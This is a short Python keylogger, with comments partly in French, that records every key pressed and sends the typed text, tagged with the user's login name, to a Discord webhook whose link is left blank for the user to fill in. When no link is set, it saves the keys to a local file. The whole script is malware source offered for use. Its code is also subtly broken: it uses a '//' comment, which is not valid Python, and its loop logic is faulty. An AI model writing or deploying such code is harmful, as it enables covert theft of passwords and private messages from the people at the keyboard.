import keyboard
import os
from discord import SyncWebhook
from datetime import date
import time

print(f"Programme Lance le {date.today()}")
path = "output.txt"
url = "" // put your discord webhook link
webhook = SyncWebhook.from_url(url)
out = ""
f = open(path, "a")

while True:
    while keyboard.read_key():
        out += keyboard.read_key()
    else:
        if url:
            webhook.send(f"{os.getlogin()} has typed: {out}")
        else:
            f.write(out)
            out = ""

    if keyboard.read_key() == "esc":
        f.close()
        exit()
